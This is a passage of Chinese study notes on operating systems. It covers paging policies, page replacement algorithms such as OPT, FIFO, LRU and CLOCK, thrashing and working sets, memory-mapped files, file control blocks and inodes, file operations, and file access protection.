<p>为确定系统将进程运行时所缺的页面调入内存的时机，可采取以下两种调页策略：</p>
<ul>
<li><strong>预调页策略</strong>：根据局部性原理，一次调入若干相邻的页会比一次调入一页更高效。但若调入的一批页面中的大多数都未被访问，则又是低效的。因此，需要采用以预测为基础的预调页策略，将那些预计在不久之后便会被访问的页面预先调入内存。但目前预调页的成功率仅约 50%。因此这种策略主要用于进程的首次调入，由程序员指出应先调入哪些页</li>
<li><strong>请求调页策略</strong>：进程在运行中需要访问的页面不在内存，便提出请求，由系统将其所需页面调入内存。由这种策略调入的页一定会被访问，且这种策略比较易于实现，因此目前的虚拟存储器大多采用此策略。其缺点是每次仅调入一页，增加了磁盘 <code>I/O</code> 开销</li>
</ul>
<p>预调入实际上就是运行前的调入，请求调页实际上就是运行期间调入。</p>
</li>
<li>
<p><strong>从何处调入页面</strong></p>
<p><strong>请求分页系统中的外存分为两部分：用于存放文件的文件区和用于存放对换页面的对换区</strong>。对换区采用连续分配方式，而文件区采用离散分配方式，因此对换区的磁盘 <code>I/O</code> 速度比文件区的更快。这样，当发生缺页请求时，系统从何处将缺页调入内存就分为三种情况：</p>
<ul>
<li><strong>系统拥有足够的对换区空间</strong>：可以全部从对换区调入所需页面，以提高调页速度。为此，在进程运行前，需将与该进程有关的文件从文件区复制到对换区</li>
<li><strong>系统缺少足够的对换区空间</strong>：凡是不会被修改的文件都直接从文件区调入；而当换出这些页面时，由于它们未被修改而不必再将它们换出。但对于那些可能被修改的部分，在将它们换出时须调到对换区，以后需要时再从对换区调入（因为读比写的速度快）</li>
<li><strong>UNIX 方式</strong>：与进程有关的文件都放在文件区，因此未运行过的页面都应从文件区调入。曾经运行过但又被换出的页面，由于是放在对换区，因此在下次调入时应从对换区调入。进程请求的共享页面若被其他进程调入内存，则无须再从对换区调入</li>
</ul>
</li>
<li>
<p><strong>如何调入页面</strong></p>
<p>当进程所访问的页面不在内存中时（存在位为 0），便向 CPU 发出缺页中断，中断响应后便转入缺页中断处理程序。该程序通过查找页表得到该页的物理块，此时如果内存未满，则启动磁盘 <code>I/O</code>，将所缺页调入内存，并修改页表。如果内存已满，则先按某种置换算法从内存中选出一页准备换出；如果该页未被修改过（修改位为 0），则无须将该页写回磁盘；但是，如果该页已被修改（修改位为 1），则必须将该页写回磁盘，然后将所缺页调入内存，并修改页表中的相应表项，置其存在位为 1。调入完成后，进程就可利用修改后的页表形成所要访问数据的内存地址。</p>
</li>
</ol>
<h4> 页面置换算法</h4>
<p>进程运行时，若其访问的页面不在内存中而需将其调入，但内存已无空闲空间时，就需要从内存中调出一页程序或数据，送入磁盘的对换区。</p>
<p><strong>选择调出页面的算法就称为页面置换算法</strong>。好的页面置换算法应有较低的页面更换频率，也就是说，应将以后不会再访问或以后较长时间内不会再访问的页面先调出。</p>
<p><strong>常见的置换算法有以下四种：</strong></p>
<ol>
<li>
<p><strong>最佳（OPT）置换算法</strong></p>
<p>最佳置换算法选择的被淘汰页面是以后永不使用的页面，或是在最长时间内不再被访问的页面，以便保证获得最低的缺页率。然而，由于人们目前无法预知进程在内存下的若干页面中哪个是未来最长时间内不再被访问的，因而该算法无法实现。但可利用该算法去评价其他算法。</p>
<p>假定系统为某进程分配了三个物理块，并考虑有页面号引用串：<code>7,0,1,2,0,3,0,4,2,3,0,3,2,1,2,0,1,7,0,1</code></p>
<p>进程运行时，先将 <code>7,0,1</code> 三个页面依次装入内存。当进程要访问页面 <code>2</code> 时，产生缺页中断，根据最佳置换算法，选择将第 <code>18</code> 次访问才需调入的页面 <code>7</code> 淘汰。然后，访问页面 <code>0</code> 时，因为它已在内存中，所以不必产生缺页中断。访问页面 <code>3</code> 时，又会根据最佳置换算法将页面 <code>1</code> 淘汰……以此类推。</p>
<figure><figcaption>最佳置换算法</figcaption></figure>
<p>发生缺页中断的次数为 9，页面置换的次数为 6。</p>
<p>最长时间不被访问和以后被访问次数最小是不同的概念。</p>
</li>
<li>
<p><strong>先进先出（FIFO）页面置换算法</strong></p>
<p>优先淘汰最早进入内存的页面，即淘汰在内存中驻留时间最久的页面。该算法实现简单，只需把已调入内存的页面根据先后次序链接成队列，设置一个指针总是指向最老的页面。但该算法与进程实际运行时的规律不适应，因为在进程中，有的页面经常被访问。</p>
<p>这里仍用上面的例子采用 FIFO 算法进行页面置换。当进程访问页面 <code>2</code> 时，把最早进入内存的页面 <code>7</code> 换出。然后访问页面 <code>3</code> 时，把 <code>2,0,1</code> 中最先进入内存的页面 <code>0</code> 换出。利用 FIFO 算法时进行了 12 次页面置换，比最佳置换算法正好多一倍。</p>
<p>FIFO 算法还会产生所分配的物理块数增大而页故障数不减反增的异常现象，称为 Belady 异常。只有 <code>FIFO</code> 算法可能出现 Belady 异常，<code>LRU</code> 和 <code>OPT</code> 算法永远不会出现 Belady 异常。</p>
<figure><figcaption>先进先出置换算法</figcaption></figure>
<p>例如：页面访问顺序为 <code>3,2,1,0,3,2,4,3,2,1,0,4</code> 若采用 <code>FIFO</code> 置换算法，当分配的物理块为 <code>3</code> 个时，缺页次数为 <code>9</code> 次；当分配的物理块为 <code>4</code> 个时，缺页次数为 <code>10</code> 次。分配给进程的物理块增多，但缺页次数不减反增。</p>
<figure><figcaption>Belady 异常</figcaption></figure>
</li>
<li>
<p><strong>最近最久未使用（LRU）置换算法</strong></p>
<p>选择最近最长时间未访问过的页面予以淘汰，它认为过去一段时间内未访问过的页面，在最近的将来可能也不会被访问。该算法为每个页面设置一个访问字段，用来记录页面自上次被访问以来所经历的时间，淘汰页面时选择现有页面中值最大的予以淘汰。</p>
<p>再对上面的例子采用 <code>LRU</code> 算法进行页面置换。进程第一次对页面 <code>2</code> 访问时，将最近最久未被访问的页面 <code>7</code> 置换出去。然后在访问页面 <code>3</code> 时，将最近最久未使用的页面 <code>1</code> 换出。</p>
<figure><figcaption>最近最久未使用置换算法</figcaption></figure>
<p><code>LRU</code> 算法根据各页以前的使用情况来判断，是 “向前看” 的，而最佳置换算法则根据各页以后的使用情况来判断，是 “向后看” 的。而页面过去和未来的走向之间并无必然联系。</p>
<p><code>LRU</code> 算法的性能较好，但需要寄存器和栈的硬件支持。<code>LRU</code> 是堆栈类的算法。理论上可以证明，堆栈类算法不可能出现 Belady 异常。<code>FIFO</code> 算法基于队列实现，不是堆栈类算法。</p>
</li>
<li>
<p><strong>时钟（CLOCK）置换算法</strong></p>
<p><code>LRU</code> 算法的性能接近 <code>OPT</code> 算法，但实现起来的开销大。因此，操作系统的设计者尝试了很多算法，试图用比较小的开销接近 <code>LRU</code> 算法的性能，这类算法都是 <code>CLOCK</code> 算法的变体。</p>
<ul>
<li>
<p><strong>简单的 CLOCK 置换算法</strong></p>
<p>为每帧设置一位访问位，当某页首次被装入或被访问时，其访问位被置为 1。对于替换算法，将内存中的所有页面视为一个循环队列，并有一个替换指针与之相关联，当某一页被替换时，该指针被设置指向被替换页面的下一页。在选择一页淘汰时，只需检查页的访问位。若为 0，就选择该页换出；若为 1，则将它置为 0，暂不换出，给予该页第二次驻留内存的机会，再依次顺序检查下一个页面。当检查到队列中的最后一个页面时，若其访问位仍为 1，则返回到队首去循环检查。由于该算法是循环地检查各个页面的使用情况，故称 <code>CLOCK</code> 算法。但是，因为该算法只有一位访问位，而置换时将未使用过的页面换出，故又称最近未用（NRU）算法。</p>
<p>假设页面访问顺序为 <code>7,0,1,2,0,3,0,4,2,3,0,3,2,1,3,2</code>，采用简单 <code>CLOCK</code> 置换算法，分配 <code>4</code> 个页帧，每个页对应的结构为（页面号，访问位）。</p>
<figure><figcaption>时钟置换算法</figcaption></figure>
<p>首次访问 <code>7,0,1,2</code> 时，产生缺页中断，依次调入主存，访问位都置为 1。访问 0 时，已存在，访问位置为 1。访问 3 时，产生第 5 次缺页中断，替换指针初始指向帧 1，此时所有帧的访问位均为 1，则替换指针完整地扫描一周，把所有帧的访问位都置为 0，然后回到最初的位置（帧 1），替换帧 1 中的页（包括置换页面和置访问位为 1）。访问 0 时，已存在，访问位置为 1。访问 4 时，产生第 6 次缺页中断，替换指针指向帧 2（上次替换位置的下一帧），帧 2 的访问位为 1，将其修改为 0，继续扫描，帧 3 的访问位为 0，替换帧 3 中的页。然后依次访问 <code>2,3,0,3,2</code>，均已存在，每次访问都将其访问位置为 1。访问 1 时，产生缺页中断，替换指针指向帧 4，此时所有帧的访问位均为 1，又完整扫描一周并置访问位为 0，回到帧 4，替换之。访问 3 时，已存在，访问位置为 1。访问 2 时，产生缺页中断，替换指针指向帧 1，帧 1 的访问位为 1，将其修改为 0，继续扫描，帧 2 的访问位为 0，替换帧 2 中的页。</p>
</li>
<li>
<p><strong>改进型 CLOCK 置换算法</strong></p>
<p>将一个页面换出时，若该页已被修改过，则要将该页写回磁盘，若该页未被修改过，则不必将它写回磁盘。可见，对于修改过的页面，替换代价更大。在改进型 <code>CLOCK</code> 算法中，除考虑页面使用情况外，还增加了置换代价——修改位。在选择页面换出时，优先考虑既未使用过又未修改过的页面。由访问位 A 和修改位 M 可以组合成下面四种类型的页面：</p>
<ul>
<li><strong>1 类 A = 0, M = 0</strong>：最近未被访问且未被修改，是最佳淘汰页</li>
<li><strong>2 类 A = 0, M = 1</strong>：最近未被访问，但已被修改，不是很好的淘汰页</li>
<li><strong>3 类 A = 1, M = 0</strong>：最近已被访问，但未被修改，可能再被访问</li>
<li><strong>4 类 A = 1, M = 1</strong>：最近已被访问且已被修改，可能再被访问</li>
</ul>
<p>内存中的每页必定都是这四类页面之一。在进行页面置换时，可采用与简单 <code>CLOCK</code> 算法类似的算法，差别在于该算法要同时检查访问位和修改位。<strong>算法执行过程如下：</strong></p>
<ul>
<li><strong>第一步</strong>：从指针的当前位置开始，扫描循环队列，寻找 <code>A = 0</code> 且 <code>M = 0</code> 的 <code>1</code> 类页面，将遇到的第一个 <code>1</code> 类页面作为选中的淘汰页。在第一次扫描期间不改变访问位</li>
<li><strong>第二步</strong>：若第一步失败，则进行第二轮扫描，寻找 <code>A = 0</code> 且 <code>M = 1</code> 的 <code>2</code> 类页面。将遇到的第一个 <code>2</code> 类页面作为淘汰页。在第二轮扫描期间，将所有扫描过的页面的访问位都置 <code>0</code></li>
<li><strong>第三步</strong>：若第二步也失败，则将指针返回到开始的位置，并将所有顿的访问位复 <code>0</code>。重复第一步，并且若有必要，重复第二步，此时一定能找到被淘汰的页。</li>
</ul>
<p>改进型 <code>CLOCK</code> 算法优于简单 <code>CLOCK</code> 算法的地方在于，可减少磁盘的 <code>I/O</code> 操作次数。但为了找到一个可置换的页，可能要经过几轮扫描，即实现算法本身的开销将有所增加。</p>
<p>操作系统中的页面置换算法都有一个原则，即尽可能保留访问过的页面，而淘汰未访问的页面。简单的 <code>CLOCK</code> 算法只考虑页面是否被访问过；改进型 <code>CLOCK</code> 算法对这两类页面做了细分，分为修改过的页面和未修改的页面。因此，若有未使用过的页面，则当然优先将其中未修改过的页面换出。若全部页面都用过，还是优先将其中未修改过的页面换出。</p>
</li>
</ul>
</li>
</ol>
<h4> 抖动和工作集</h4>
<ol>
<li>
<p><strong>抖动</strong></p>
<p>在页面置换过程中，一种最糟糕的情形是，刚刚换出的页面马上又要换入主存，刚刚换入的页面马上又要换出主存，这种频繁的页面调度行为称为抖动或颠簸。</p>
<p><strong>系统发生抖动的根本原因是</strong>，系统中同时运行的进程太多，由此分配给每个进程的物理块太少，不能满足进程正常运行的基本要求，致使每个进程在运行时频繁地出现缺页，必须请求系统将所缺页面调入内存。这会使得在系统中排队等待页面调入/调出的进程数目增加。显然，对磁盘的有效访问时间也随之急剧增加，造成每个进程的大部分时间都用于页面的换入/换出，而几乎不能再去做任何有效的工作，进而导致发生处理机的利用率急剧下降并趋于零的情况。</p>
<p>抖动是进程运行时出现的严重问题，必须采取相应的措施解决它。由于抖动的发生与系统为进程分配物理块的多少有关，于是又提出了关于进程工作集的概念。</p>
</li>
<li>
<p><strong>工作集</strong></p>
<p>工作集是指在某段时间间隔内，进程要访问的页面集合。基于局部性原理，可以用最近访问过的页面来确定工作集。一般来说，工作集 <code>W</code> 可由时间 <code>t</code> 和工作集窗口大小来确定。</p>
<p>实际应用中，工作集窗口会设置得很大，即对于局部性好的程序，工作集大小一般会比工作集窗口小很多。工作集反映了进程在接下来的一段时间内很有可能会频繁访问的页面集合，因此，若分配给进程的物理块小于工作集大小，则该进程就很有可能频繁缺页，所以为了防止这种抖动现象，一般来说分配给进程的物理块数（即驻留集大小）要大于工作集大小。</p>
<p><strong>工作集模型的原理是</strong>，让操作系统跟踪每个进程的工作集，并为进程分配大于其工作集的物理块。落在工作集内的页面需要调入驻留集中，而落在工作集外的页面可从驻留集中换出。若还有空闲物理块，则可再调一个进程到内存。若所有进程的工作集之和超过了可用物理块总数，则操作系统会暂停一个进程，将其页面调出并将物理块分配给其他进程，防止出现抖动现象。</p>
</li>
</ol>
<h4> 内存映射文件</h4>
<p>内存映射文件（Memory-Mapped Files）与虚拟内存有些相似，将磁盘文件的全部或部分内容与进程虚拟地址空间的某个区域建立映射关系，便可以直接访问被映射的文件，而不必执行文件 <code>I/O</code> 操作，也无须对文件内容进行缓存处理。这种特性非常适合用来管理大尺寸文件。</p>
<p>使用内存映射文件所进行的任何实际交互都是在内存中进行的，并且是以标准的内存地址形式来访问的。磁盘的周期性分页是由操作系统在后台隐蔽实现的，对应用程序而言是完全透明的。系统内存中的所有页面都由虚拟存储器负责管理，虚拟存储器以统一的方式处理所有磁盘 <code>I/O</code>。当进程退出或显式地解除文件映射时，所有被改动的页面会被写回磁盘文件。</p>
<p>多个进程允许并发地内存映射同一文件，以便允许数据共享。实际上，很多时候，共享内存是通过内存映射来实现的。进程可以通过共享内存来通信，而共享内存是通过映射相同文件到通信进程的虚拟地址空间实现的。内存映射文件充当通信进程之间的共享内存区域。一个进程在共享内存上完成了写操作，此刻当另一个进程在映射到这个文件的虚拟地址空间上执行读操作时，就能立刻看到上一个进程写操作的结果。</p>
<h4> 虚拟存储器性能影响因素</h4>
<p>缺页率（缺页率高即为抖动）是影响虚拟存储器性能的主要因素，且缺页率又受到页面大小、分配给进程的物理块数（取决于工作集）、页面置换算法以及程序的编制方法的影响。</p>
<p>根据局部性原理，页面较大则缺页率较低，页面较小则缺页率较高。页面较小时，一方面减少了内存碎片，有利于提高内存利用率；另一方面，也会使每个进程要求较多的页面，导致页表过长，占用大量内存。页面较大时，虽然可以减少页表长度，但会使页内碎片增大。</p>
<p>分配给进程的物理块数越多，缺页率就越低，但是当物理块超过某个数目时，再为进程增加一个物理块对缺页率的改善是不明显的。可见，此时已没有必要再为它分配更多的物理块，否则也只能是浪费内存空间。只要保证活跃页面在内存中，保持缺页率在一个很低的范围即可。</p>
<p>好的页面置换算法可使进程在运行过程中具有较低的缺页率。选择 <code>LRU</code>、<code>CLOCK</code> 等置换算法，将未来有可能访问的页面尽量保留在内存中，从而提高页面的访问速度。</p>
<p>写回磁盘的频率。换出已修改过的页面时，应当写回磁盘，如果每当一个页面被换出时就将它写回磁盘，那么每换出一个页面就需要启动一次磁盘，效率极低。为此在系统中建立一个已修改换出页面的链表，对每个要被换出的页面（已修改），可以暂不将它们写回磁盘，而将它们挂在该链表上，仅当被换出页面数达到给定值时，才将它们一起写回磁盘，这样就可显著减少磁盘 <code>I/O</code> 的次数，即减少已修改页面换出的开销。此外，如果有进程在这批数据还未写回磁盘时需要再次访问这些页面，就不需从外存调入，而直接从已修改换出页面链表上获取，这样也可以减少页面从磁盘读入内存的频率，减少页面换进的开销。</p>
<p>编写程序的局部化程度越高，执行时的缺页率就越低。如果存储采用的是按行存储，访问时就要尽量采用相同的访问方式，避免按列访问造成缺页率过高的现象。</p>
<h2> 文件管理</h2>
<h3> 文件系统基础</h3>
<h4> 文件的基本概念</h4>
<p>文件（File）是以硬盘为载体的存储在计算机上的信息集合，文件可以是文本文档、图片、程序等。在系统运行时，计算机以进程为基本单位进行资源的调度和分配；而在用户进行的输入、输出中，则以文件为基本单位。大多数应用程序的输入都是通过文件来实现的，其输出也都保存在文件中，以便信息的长期存储及将来的访问。当用户将文件用于程序的输入、输出时，还希望可以访问、修改和保存文件等，实现对文件的维护管理，这就需要系统提供一个文件管理系统，操作系统中的文件系统（File System）就是用于实现用户的这些管理要求的。</p>
<p>要清晰地理解文件的概念，就要了解文件由哪些东西组成。</p>
<p>首先，文件中肯定包括一块存储空间，更准确地说，是存储空间中的数据；其次，由于操作系统要管理成千上万的数据，因此必定需要对这些数据进行划分，然后贴上 “标签”，以便于分类和索引，所以文件必定包含分类和索引的信息；最后，不同的用户拥有对数据的不同访问权限，因此文件中一定包含一些关于访问权限的信息。</p>
<p>举一个直观的例子 “图书馆管理图书” 来类比文件。可以认为，计算机中的一个文件相当于图书馆中的一本书，操作系统管理文件，相当于图书管理员管理图书馆中的书。</p>
<p>首先，一本书的主体一定是书中的内容，相当于文件中的数据；其次，不同类别的书需要放在不同的书库，然后加上编号，再把编号登记在图书管理系统中，方便读者查阅，相当于文件的分类和查找；最后，有些已经绝版或价格比较高的外文书籍，只能借给 VIP 会员或权限比较高的其他读者，而有些普通的书籍可供任何人借阅，这就是文件中的访问权限。</p>
<p>从用户的角度看，文件系统是操作系统的重要部分之一。用户关心的是如何命名、分类和查找文件，如何保证文件数据的安全性及对文件可以进行哪些操作等。而对于其中的细节，如：文件如何存储在辅存上、如何管理文件辅存区域等方面关心甚少。</p>
<p>文件系统提供了与二级存储相关的资源的抽象，让用户能在不了解文件的各种属性、文件存储介质的特征及文件在存储介质上的具体位置等情况下，方便快捷地使用文件。用户通过文件系统建立文件，用于应用程序的输入、输出，对资源进行管理。</p>
<p><strong>首先了解文件的结构，通过自底向上的方式来定义：</strong></p>
<ul>
<li>
<p><strong>数据项</strong>：是文件系统中最低级的数据组织形式，可分为以下两种类型：</p>
<ul>
<li><strong>基本数据项</strong>：用于描述一个对象的某种属性的一个值，是数据中的最小逻辑单位</li>
<li><strong>组合数据项</strong>：由多个基本数据项组成</li>
</ul>
</li>
<li>
<p><strong>记录</strong>：是一组相关的数据项的集合，用于描述一个对象在某方面的属性</p>
</li>
<li>
<p><strong>文件</strong>：是指由创建者所定义的、具有文件名的一组相关元素的集合，可分为有结构文件和无结构文件两种。在有结构的文件中，文件由若干个相似的记录组成，如一个班的学生记录；而无结构文件则被视为一个字符流，比如一个二进制文件或字符文件</p>
</li>
</ul>
<p>虽然上面给出了结构化的表述，但实际上关于文件并无严格的定义。在操作系统中，通常将程序和数据组织成文件。文件可以是数字、字符或二进制代码，基本访问单元可以是字节或记录。文件可以长期存储在硬盘中，允许可控制的进程间共享访问，能够被组织成复杂的结构。</p>
<h4> 文件控制块和索引结点</h4>
<p>与进程管理一样，为便于文件管理，在操作系统中引入了文件控制块的数据结构。</p>
<ol>
<li>
<p><strong>文件的属性</strong></p>
<p>除了文件数据，操作系统还会保存与文件相关的信息，如：所有者、创建时间等，这些附加信息称为文件属性或文件元数据。<strong>文件属性在不同系统中差别很大，但通常都包括如下属性：</strong></p>
<ul>
<li><strong>名称</strong>：文件名称唯一，以容易读取的形式保存</li>
<li><strong>类型</strong>：被支持不同类型的文件系统所使用</li>
<li><strong>创建者</strong>：文件创建者的 ID</li>
<li><strong>所有者</strong>：文件当前所有者的 ID</li>
<li><strong>位置</strong>：指向设备和设备上文件的指针</li>
<li><strong>大小</strong>：文件当前大小（用字节、字或块表示），也可包含文件允许的最大值</li>
<li><strong>保护</strong>：对文件进行保护的访问控制信息</li>
<li><strong>创建时间、最后一次修改时间和最后一次存取时间</strong>：文件创建、上次修改和上次访问的相关信息，用于保护和跟踪文件的使用</li>
</ul>
<p>操作系统通过文件控制块（FCB）来维护文件元数据。</p>
</li>
<li>
<p><strong>文件控制块</strong></p>
<p>文件控制块（FCB）是用来存放控制文件需要的各种信息的数据结构，以实现 “按名存取”。<code>FCB</code> 的有序集合称为文件目录，一个 <code>FCB</code> 就是一个文件目录项。为了配一个 <code>FCB</code> 并存放在文件且录中，称为目录项。</p>
<p><strong>FCB 主要包含以下信息：</strong></p>
<ul>
<li>基本信息，如文件名、文件的物理位置、文件的逻辑结构、文件的物理结构等</li>
<li>存取控制信息，包括文件主的存取权限、核准用户的存取权限以及一般用户的存取权限</li>
<li>使用信息，如：文件建立时间、上次修改时间等</li>
</ul>
<p>一个文件目录也被视为一个文件，称为目录文件。</p>
</li>
<li>
<p><strong>索引结点</strong></p>
<p>文件目录通常存放在磁盘上，当文件很多时，文件目录会占用大量的盘块。在查找目录的过程中，要先将存放目录文件的第一个盘块中的目录调入内存，然后用给定的文件名逐一比较，若未找到指定文件，就还需要不断地将下一盘块中的目录项调入内存，逐一比较。在检索目录的过程中，只用到了文件名，仅当找到一个目录项（其中的文件名与要查找的文件名匹配）时，才需从该目录项中读出该文件的物理地址。也就是说，在检索目录时，文件的其他描述信息不会用到，也不需要调入内存。因此，有的系统（如 UNIX）便采用了文件名和文件描述信息分开的方法，使文件描述信息单独形成一个称为索引结点的数据结构，简称 <code>i</code> 结点（inode）。在文件目录中的每个目录项仅由文件名和指向该文件所对应的 <code>i</code> 结点的指针构成。</p>
<p>假设一个 <code>FCB</code> 为 <code>64B</code>，盘块大小是 <code>1KB</code>，则每个盘块中可以存放 <code>16</code> 个 <code>FCB</code>（FCB 必须连续存放），若一个文件目录共有 <code>640</code> 个 <code>FCB</code>，则查找文件平均需要启动磁盘 <code>20</code> 次。而在 UNIX 系统中，一个目录项仅占 <code>16B</code>，其中 <code>14B</code> 是文件名，<code>2B</code> 是 <code>i</code> 结点指针。在 <code>1KB</code> 的盘块中可存放 <code>64</code> 个目录项。这样，可使查找文件的平均启动磁盘次数减少到原来的 1/4，大大节省了系统开销。</p>
<ul>
<li>
<p><strong>磁盘索引结点</strong></p>
<p>它是指存放在磁盘上的索引结点。每个文件有一个唯一的磁盘索引结点，主要包括以下内容：</p>
<ul>
<li><strong>文件主标识符</strong>：拥有该文件的个人或小组的标识符</li>
<li><strong>文件类型</strong>：包括普通文件、目录文件或特别文件</li>
<li><strong>文件存取权限</strong>：各类用户对该文件的存取权限</li>
<li><strong>文件物理地址</strong>：每个索引结点中含有 <code>13</code> 个地址项，即 <code>iaddr(0)~iaddr(12)</code>，它们以直接或间接方式给出数据文件所在盘块的编号</li>
<li><strong>文件长度</strong>：指以字节为单位的文件长度</li>
<li><strong>文件链接计数</strong>：在本文件系统中所有指向该文件的文件名的指针计数</li>
<li><strong>文件存取时间</strong>：本文件最近被进程存取的时间、最近被修改的时间及索引结点最近被修改的时间</li>
</ul>
</li>
<li>
<p><strong>内存索引结点</strong></p>
<p>它是指存放在内存中的索引结点。当文件被打开时，要将磁盘索引结点复制到内存的索引结点中，便于以后使用。在内存索引结点中增加了以下内容：</p>
<ul>
<li><strong>索引结点编号</strong>：用于标识内存索引结点</li>
<li><strong>状态</strong>：指示 <code>i</code> 结点是否上锁或被修改</li>
<li><strong>访问计数</strong>：每当有一进程要访问此 <code>i</code> 结点时，计数加 1；访问结束减 1</li>
<li><strong>逻辑设备号</strong>：文件所属文件系统的逻辑设备号</li>
<li><strong>链接指针</strong>：设置分别指向空闲链表和散列队列的指针</li>
</ul>
<p>FCB 或索引结点相当于图书馆中图书的索书号，可以在图书馆网站上找到图书的索书号，然后根据索书号找到想要的书本。</p>
</li>
</ul>
</li>
</ol>
<h4> 文件的操作</h4>
<ol>
<li>
<p><strong>文件的基本操作</strong></p>
<p>文件属于抽象数据类型。为了正确地定义文件，需要考虑可以对文件执行的操作。操作系统提供系统调用，它对文件进行创建、写、读、重定位、删除和截断等操作。</p>
<ul>
<li><strong>创建文件</strong>：创建文件有两个必要步骤：一是为新文件分配必要的外存空间；二是在目录中为之创建一个目录项，目录项记录了新文件名、在外存中的地址及其他可能的信息</li>
<li><strong>写文件</strong>：为了写文件，执行一个系统调用。对于给定文件名，搜索目录以查找文件位置。系统必须为该文件维护一个写位置的指针。每当发生写操作时，便更新写指针</li>
<li><strong>读文件</strong>：为了读文件，执行一个系统调用。同样需要搜索目录以找到相关目录项，系统维护一个读位置的指针。每当发生读操作时，更新读指针。一个进程通常只对一个文件读或写，因此当前操作位置可作为每个进程当前文件位置的指针。由于读和写操作都使用同一指针，因此节省了空间，也降低了系统复杂度</li>
<li><strong>重新定位文件</strong>：也称文件定位。搜索目录以找到适当的条目，并将当前文件位置指针重新定位到给定值。重新定位文件不涉及读、写文件</li>
<li><strong>删除文件</strong>：为了删除文件，先从目录中检索指定文件名的目录项，然后释放该文件所占的存储空间，以便可被其他文件重复使用，并删除目录条目</li>
<li><strong>截断文件</strong>：允许文件所有属性不变，并删除文件内容，将其长度置为 0 并释放其空间</li>
</ul>
<p>这 6 个基本操作可以组合起来执行其他文件操作。例如：一个文件的复制，可以创建新文件、从旧文件读出并写入新文件。</p>
</li>
<li>
<p><strong>文件的打开与关闭</strong></p>
<p>当用户对一个文件实施操作时，每次都要从检索目录开始。为了避免多次重复地检索目录，大多数操作系统要求，在文件使用之前通过系统调用 <code>open</code> 被显式地打开。操作系统维护一个包含所有打开文件信息的表（打开文件表）。所谓 “打开”，是指调用 <code>open</code> 根据文件名搜索目录，将指明文件的属性（包括该文件在外存上的物理位置），从外存复制到内存打开文件表的一个表目中，并将该表目的编号（也称索引）返回给用户。当用户再次向系统发出文件操作请求时，可通过索引在打开文件表中查到文件信息，从而节省再次搜索目录的开销。当文件不再使用时，可利用系统调用 <code>close</code> 关闭它，操作系统将会从打开文件表中删除这一条目。</p>
<p>在多个不同进程可以同时打开文件的操作系统中，通常采用两级表：<strong>整个系统表</strong> 和 <strong>每个进程表</strong>。整个系统的打开文件表包含 <code>FCB</code> 的副本及其他信息。每个进程的打开文件表根据它打开的所有文件，包含指向系统表中适当条目的指针。一旦有进程打开了一个文件，系统表就包含该文件的条目。当另一个进程执行调用 <code>open</code> 时，只不过是在其文件打开表中增加一个条目，并指向系统表的相应条目。通常，系统打开文件表为每个文件关联一个 <strong>打开计数器（Open Count）</strong>，以记录多少进程打开了该文件。每个关闭操作 <code>close</code> 使 <code>count</code> 递减，当打开计数器为 <code>0</code> 时，表示该文件不再被使用，并且可从系统打开文件表中删除相应条目。</p>
<p>文件名不必是打开文件表的一部分，因为一旦完成对 <code>FCB</code> 在磁盘上的定位，系统就不再使用文件名。对于访问打开文件表的索引，UNIX 称之为文件描述符，而 Windows 称之为文件句柄。因此，只要文件未被关闭，所有文件操作就通过打开文件表来进行。</p>
<p><strong>每个打开文件都具有如下关联信息：</strong></p>
<ul>
<li><strong>文件指针</strong>：系统跟踪上次的读写位置作为当前文件位置的指针，这种指针对打开文件的某个进程来说是唯一的，因此必须与磁盘文件属性分开保存</li>
<li><strong>文件打开计数</strong>：计数器跟踪当前文件打开和关闭的数量。因为多个进程可能打开同一个文件，所以系统在删除打开文件条目之前，必须等待最后一个进程关闭文件</li>
<li><strong>文件磁盘位置</strong>：大多数文件操作要求系统修改文件数据。查找磁盘上的文件所需的信息保存在内存中，以便系统不必为每个操作都从磁盘上读取该信息</li>
<li><strong>访问权限</strong>：每个进程打开文件都需要有一个访问模式（创建、只读、读写、添加等）。该信息保存在进程的打开文件表中，以便操作系统能够允许或拒绝后续的 <code>I/O</code> 请求</li>
</ul>
</li>
</ol>
<h4> 文件保护</h4>
<p>为了防止文件共享可能会导致文件被破坏或未经核准的用户修改文件，文件系统必须控制用户对文件的存取，即解决对文件的读、写、执行的许可问题。为此，必须在文件系统中建立相应的文件保护机制。文件保护通过口令保护、加密保护和访问控制等方式实现。其中，口令和加密是为了防止用户文件被他人存取或窃取，而访问控制则用于控制用户对文件的访问方式。</p>
<ol>
<li>
<p><strong>访问类型</strong></p>
<p>对文件的保护可从限制对文件的访问类型中出发。<strong>可加以控制的访问类型主要有以下几种：</strong></p>
<ul>
<li><strong>读</strong>：从文件中读</li>
<li><strong>写</strong>：向文件中写</li>
<li><strong>执行</strong>：将文件装入内存并执行</li>
<li><strong>添加</strong>：将新信息添加到文件结尾部分</li>
<li><strong>删除</strong>：删除文件，释放空间</li>
<li><strong>列表清单</strong>：列出文件名和文件属性</li>
</ul>
<p>此外还可以对文件的重命名、复制、编辑等加以控制。这些高层的功能可以通过系统程序调用低层系统调用来实现。保护可以只在低层提供。例如：复制文件可利用一系列的读请求来完成，这样，具有读访问权限的用户同时也就具有了复制和打印权限。</p>
</li>
<li>
<p><strong>访问控制</strong></p>
<p>解决访问控制最常用的方法是 <strong>根据用户身份进行控制</strong>。而实现基于身份访问的最为普通的方法是，为每个文件和目录增加一个 <strong>访问控制列表（Access-Control List，ACL）</strong>，以规定每个用户名及其所允许的访问类型。这种方法的 <strong>优点</strong> 是可以使用复杂的访问方法，<strong>缺点</strong> 是长度无法预计并且可能导致复杂的空间管理，使用精简的访问列表可以解决这个问题。</p>
<p><strong>精简的访问列表采用拥有者、组和其他三种用户类型：</strong></p>
<ul>
<li><strong>拥有者</strong>：创建文件的用户</li>
<li><strong>组</strong>：一组需要共享文件且具有类似访问的用户</li>
<li><strong>其他</strong>：系统内的所有其他用户</li>
</ul>
<p>这样，只需用三个域即可列出访问表中这三类用户的访问权限。文件主在创建文件时，说明创建者用户名及所在的组名，系统在创建文件时也将文件主的名字、所属组名列在该文件的 <code>FCB</code> 中。用户访问该文件时，若用户是文件主，按照文件主所拥有的权限访问文件；若用户和文件主在同一个用户组，则按照同组权限访问，否则只能按其他用户权限访问。</p>
<p><strong>口令和密码是另外两种访问控制方法：</strong></p>
<ul>
<li><strong>口令</strong>：指用户在建立一个文件时提供一个口令，系统为其建立 <code>FCB</code> 时附上相应口令，同时告诉允许共享该文件的其他用户。用户请求访问时必须提供相应的口令。这种方法时间和空间的开销不多，缺点是口令直接存在系统内部，不够安全</li>
